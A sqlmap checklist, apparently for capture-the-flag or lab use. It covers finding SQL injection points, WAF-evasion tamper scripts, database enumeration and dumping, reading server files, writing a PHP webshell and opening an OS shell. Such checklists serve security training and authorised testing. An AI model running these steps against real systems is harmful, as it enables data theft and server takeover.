# SQLMap Checklist

**Rule:** Read the target page/source first. Build the right command once. Escalate only when needed.

## Pre-Flight
- [ ] Identify injection parameter: GET param, POST body, cookie, header, or request file
- [ ] Check if parameter is dynamic (uid, token) — fetch the page to understand format
- [ ] Check for anti-CSRF token in form source
- [ ] Note any WAF behavior (blocks, rate limits, error changes)
- [ ] If POST: intercept with Burp, save raw request to `request.txt`

## Baseline Run
- [ ] Run simplest command first with `--batch`
- [ ] GET: `sqlmap -u "URL?param=val" --batch`
- [ ] POST: `sqlmap -u "URL" --data="param=val" --batch`
- [ ] File: `sqlmap -r request.txt --batch`
- [ ] If injection not found → confirm you have the right parameter

## Special Handling
- [ ] Non-obvious injection point → add `*` marker to parameter value
- [ ] Anti-CSRF token → add `--csrf-token="fieldName"`
- [ ] Dynamic parameter (randomized per request) → add `--randomize=paramName`
- [ ] Calculated parameter → add `--eval="<python expression>"`
- [ ] Cookie injection → add `--cookie="name=value"`

## Escalation (if baseline fails)
- [ ] Try `--level=3 --risk=2`
- [ ] Try `--level=5 --risk=3`
- [ ] Force technique: `--technique=BEU` or `--technique=E`
- [ ] Add `--prefix` / `--suffix` if query structure is known (e.g., `--prefix=")"`)
- [ ] Add `--tamper=between,randomcase,space2comment` for WAF

## Enumeration
- [ ] `--dbs` → find target database
- [ ] `-D dbname --tables` → find target table
- [ ] `-D dbname -T tablename --columns` → find target columns
- [ ] `-D dbname -T tablename -C col --dump` → extract data

## OS Exploitation
- [ ] `--is-dba` → confirm DBA privilege
- [ ] `--file-read="/var/www/html/flag.txt"` → read sensitive files
- [ ] `--file-write="local.php" --file-dest="/var/www/html/shell.php"` → write webshell
- [ ] `--os-shell --technique=E` → interactive shell
- [ ] In shell: `find / -name "flag*" 2>/dev/null`

## Pitfall Reminders
- [ ] UNION returning wrong data → add `--no-cast`
- [ ] UNION wrong column count → add `--union-cols=3-6`
- [ ] SSL/HTTPS → no flags needed, sqlmap handles it automatically
- [ ] Dynamic uid → don't hardcode, fetch page first then use `--randomize`
- [ ] Token split by terminal newline → store in `$TOKEN` var, pass inline
